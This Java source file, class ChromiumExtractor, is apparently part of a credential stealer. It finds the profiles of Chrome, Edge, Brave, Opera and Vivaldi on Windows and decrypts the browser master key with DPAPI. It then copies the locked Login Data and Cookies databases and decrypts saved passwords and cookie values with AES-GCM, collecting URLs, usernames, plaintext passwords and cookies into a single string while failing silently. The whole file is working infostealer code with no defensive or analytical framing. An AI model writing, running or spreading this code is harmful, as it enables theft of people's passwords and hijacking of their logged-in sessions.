package me.visoxd.browser;

import com.github.windpapi4j.WinDPAPI;
import com.github.windpapi4j.WinDPAPI.CryptProtectFlag;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class ChromiumExtractor {
    
    private static class BrowserConfig {
        String name;
        String path;
        
        BrowserConfig(String name, String path) {
            this.name = name;
            this.path = path;
        }
    }
    
    private static final BrowserConfig[] BROWSERS = {
        new BrowserConfig("Chrome", System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default"),
        new BrowserConfig("Edge", System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default"),
        new BrowserConfig("Brave", System.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default"),
        new BrowserConfig("Opera", System.getenv("APPDATA") + "\\Opera Software\\Opera Stable"),
        new BrowserConfig("Vivaldi", System.getenv("LOCALAPPDATA") + "\\Vivaldi\\User Data\\Default")
    };
    
    public static String extractAllChromiumBrowsers() {
        StringBuilder result = new StringBuilder();
        
        for (BrowserConfig browser : BROWSERS) {
            try {
                String browserData = extractBrowserData(browser);
                if (browserData != null && !browserData.isEmpty()) {
                    result.append(browserData).append("\n");
                }
            } catch (Exception e) {
                // Silent failure - browser might not be installed
            }
        }
        
        return result.toString();
    }
    
    private static String extractBrowserData(BrowserConfig browser) {
        try {
            File profileDir = new File(browser.path);
            if (!profileDir.exists()) {
                return null;
            }
            
            // Get AES key from Local State
            byte[] aesKey = getAESKey(browser);
            if (aesKey == null) {
                return null;
            }
            
            StringBuilder result = new StringBuilder();
            result.append("--- ").append(browser.name).append(" ---\n");
            
            // Extract passwords
            String passwords = extractPasswords(browser, aesKey);
            if (passwords != null && !passwords.isEmpty()) {
                result.append("PASSWORDS:\n").append(passwords);
            }
            
            // Extract cookies
            String cookies = extractCookies(browser, aesKey);
            if (cookies != null && !cookies.isEmpty()) {
                result.append("COOKIES:\n").append(cookies);
            }
            
            return result.toString();
            
        } catch (Exception e) {
            return null;
        }
    }
    
    private static byte[] getAESKey(BrowserConfig browser) {
        try {
            // Local State is one directory up from Default
            Path localStatePath;
            if (browser.name.equals("Opera")) {
                localStatePath = Paths.get(browser.path, "Local State");
            } else {
                localStatePath = Paths.get(browser.path).getParent().resolve("Local State");
            }
            
            if (!Files.exists(localStatePath)) {
                return null;
            }
            
            // Read and parse Local State JSON
            String localStateJson = new String(Files.readAllBytes(localStatePath));
            JsonObject jsonObject = JsonParser.parseString(localStateJson).getAsJsonObject();
            
            String encryptedKeyB64 = jsonObject
                .getAsJsonObject("os_crypt")
                .get("encrypted_key")
                .getAsString();
            
            // Decode Base64
            byte[] encryptedKey = Base64.getDecoder().decode(encryptedKeyB64);
            
            // Remove "DPAPI" prefix (5 bytes)
            byte[] encryptedKeyNoDPAPI = new byte[encryptedKey.length - 5];
            System.arraycopy(encryptedKey, 5, encryptedKeyNoDPAPI, 0, encryptedKeyNoDPAPI.length);
            
            // Decrypt with DPAPI
            WinDPAPI winDPAPI = WinDPAPI.newInstance(CryptProtectFlag.CRYPTPROTECT_UI_FORBIDDEN);
            byte[] decryptedKey = winDPAPI.unprotectData(encryptedKeyNoDPAPI);
            
            return decryptedKey;
            
        } catch (Exception e) {
            return null;
        }
    }
    
    private static String extractPasswords(BrowserConfig browser, byte[] aesKey) {
        try {
            File loginDataFile = new File(browser.path, "Login Data");
            if (!loginDataFile.exists()) {
                return null;
            }
            
            // Copy to temp file (browser might have it locked)
            File tempFile = File.createTempFile("login", ".db");
            tempFile.deleteOnExit();
            Files.copy(loginDataFile.toPath(), tempFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
            
            StringBuilder result = new StringBuilder();
            
            try (Connection conn = DriverManager.getConnection("jdbc:sqlite:" + tempFile.getAbsolutePath());
                 Statement stmt = conn.createStatement()) {
                
                ResultSet rs = stmt.executeQuery(
                    "SELECT origin_url, username_value, password_value FROM logins"
                );
                
                int count = 0;
                while (rs.next() && count < 50) {
                    String url = rs.getString("origin_url");
                    String username = rs.getString("username_value");
                    byte[] encryptedPassword = rs.getBytes("password_value");
                    
                    if (encryptedPassword != null && encryptedPassword.length > 15) {
                        String password = decryptPassword(encryptedPassword, aesKey);
                        if (password != null && !password.isEmpty() && !username.isEmpty()) {
                            result.append("  URL: ").append(url).append("\n");
                            result.append("  User: ").append(username).append("\n");
                            result.append("  Pass: ").append(password).append("\n\n");
                            count++;
                        }
                    }
                }
            }
            
            tempFile.delete();
            return result.toString();
            
        } catch (Exception e) {
            return null;
        }
    }
    
    private static String extractCookies(BrowserConfig browser, byte[] aesKey) {
        try {
            File cookiesFile = new File(browser.path, "Network/Cookies");
            if (!cookiesFile.exists()) {
                // Try alternate location
                cookiesFile = new File(browser.path, "Cookies");
                if (!cookiesFile.exists()) {
                    return null;
                }
            }
            
            // Copy to temp file
            File tempFile = File.createTempFile("cookies", ".db");
            tempFile.deleteOnExit();
            Files.copy(cookiesFile.toPath(), tempFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
            
            StringBuilder result = new StringBuilder();
            
            try (Connection conn = DriverManager.getConnection("jdbc:sqlite:" + tempFile.getAbsolutePath());
                 Statement stmt = conn.createStatement()) {
                
                ResultSet rs = stmt.executeQuery(
                    "SELECT host_key, name, encrypted_value FROM cookies LIMIT 100"
                );
                
                while (rs.next()) {
                    String host = rs.getString("host_key");
                    String name = rs.getString("name");
                    byte[] encryptedValue = rs.getBytes("encrypted_value");
                    
                    if (encryptedValue != null && encryptedValue.length > 15) {
                        String value = decryptPassword(encryptedValue, aesKey);
                        if (value != null && !value.isEmpty()) {
                            result.append("  ").append(host).append(" - ").append(name)
                                  .append(": ").append(value.substring(0, Math.min(value.length(), 50)))
                                  .append("\n");
                        }
                    }
                }
            }
            
            tempFile.delete();
            return result.toString();
            
        } catch (Exception e) {
            return null;
        }
    }
    
    private static String decryptPassword(byte[] encryptedData, byte[] aesKey) {
        try {
            // Check for v10/v11 prefix
            if (encryptedData.length < 15 || 
                (encryptedData[0] != 'v' || encryptedData[1] != '1' || 
                 (encryptedData[2] != '0' && encryptedData[2] != '1'))) {
                // Try DPAPI fallback for older Chrome
                try {
                    WinDPAPI winDPAPI = WinDPAPI.newInstance(CryptProtectFlag.CRYPTPROTECT_UI_FORBIDDEN);
                    byte[] decrypted = winDPAPI.unprotectData(encryptedData);
                    return new String(decrypted, "UTF-8");
                } catch (Exception e) {
                    return null;
                }
            }
            
            // Extract IV (12 bytes after 3-byte prefix)
            byte[] iv = new byte[12];
            System.arraycopy(encryptedData, 3, iv, 0, 12);
            
            // Extract ciphertext (everything except prefix, IV, and 16-byte auth tag)
            int ciphertextLength = encryptedData.length - 3 - 12 - 16;
            byte[] ciphertext = new byte[ciphertextLength];
            System.arraycopy(encryptedData, 3 + 12, ciphertext, 0, ciphertextLength);
            
            // Extract auth tag (last 16 bytes)
            byte[] tag = new byte[16];
            System.arraycopy(encryptedData, encryptedData.length - 16, tag, 0, 16);
            
            // Combine ciphertext and tag for GCM
            byte[] ciphertextWithTag = new byte[ciphertext.length + tag.length];
            System.arraycopy(ciphertext, 0, ciphertextWithTag, 0, ciphertext.length);
            System.arraycopy(tag, 0, ciphertextWithTag, ciphertext.length, tag.length);
            
            // Decrypt with AES-256-GCM
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            SecretKeySpec keySpec = new SecretKeySpec(aesKey, "AES");
            GCMParameterSpec gcmSpec = new GCMParameterSpec(128, iv);
            cipher.init(Cipher.DECRYPT_MODE, keySpec, gcmSpec);
            
            byte[] decrypted = cipher.doFinal(ciphertextWithTag);
            return new String(decrypted, "UTF-8");
            
        } catch (Exception e) {
            return null;
        }
    }
}
